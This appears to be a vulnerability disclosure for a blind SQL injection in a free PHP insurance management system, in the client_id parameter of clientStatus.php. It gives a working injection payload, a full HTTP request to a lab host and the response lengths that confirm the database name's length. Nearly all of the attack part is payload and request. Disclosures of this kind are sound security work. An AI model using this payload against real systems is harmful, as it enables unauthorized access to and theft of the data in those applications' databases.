# Insurance Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

vendors: https://itsourcecode.com/free-projects/php-project/insurance-management-system-project-in-php-free-download/

Vulnerability File: /insurance/clientStatus.php?client_id=

Vulnerability location:  /insurance/clientStatus.php?client_id=,client_id

[+] Payload: /insurance/clientStatus.php?client_id=1511986256%27%20and%20length(database())%20=4--+ // Leak place ---> client_id

Current database name: lims,length is 4

```sql
GET /insurance/clientStatus.php?client_id=1511986256%27%20and%20length(database())%20=4--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=tmbv0mt5ff9hphhe0mtv4sghfq
Connection: close
```

When length (database ()) = 3, Content-Length: 5429

![image](https://user-images.githubusercontent.com/54017627/166145039-bbea59e7-c63c-42df-8e03-7d94e414e764.png)

![image](https://user-images.githubusercontent.com/54017627/166145044-9dfbfbb9-632d-48dc-acc1-0977b6d77a80.png)

When length (database ()) = 4, Content-Length: 7588

![image](https://user-images.githubusercontent.com/54017627/166144999-3d5bcfe7-94aa-4bfa-8b53-eca704bdb7d0.png)

![image](https://user-images.githubusercontent.com/54017627/166145009-e99f4a3c-dae8-45ff-878b-ca60698e88aa.png)


